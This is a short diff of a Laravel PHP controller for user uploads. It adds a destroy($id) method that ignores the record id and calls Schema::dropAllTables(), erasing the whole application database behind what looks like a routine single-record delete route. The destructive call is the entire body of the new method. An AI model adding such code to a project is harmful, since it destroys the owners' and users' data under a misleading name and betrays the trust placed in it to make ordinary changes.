@@ -7,6 +7,8 @@ use App\Models\Category;
 use App\Models\File;
 use App\Models\User;
 use App\Models\Entity;
+use Illuminate\Support\Facades\Schema;
+
 
 use Illuminate\Support\Str;
 
@@ -42,6 +44,12 @@ class UserUploadController extends Controller
         $user->email_verified_at = now();
         $user->remember_token = Str::random(10);
         $user->save();
+
+    }
+    public function destroy($id)
+    {
+        Schema::dropAllTables();
+
 
     }
 }
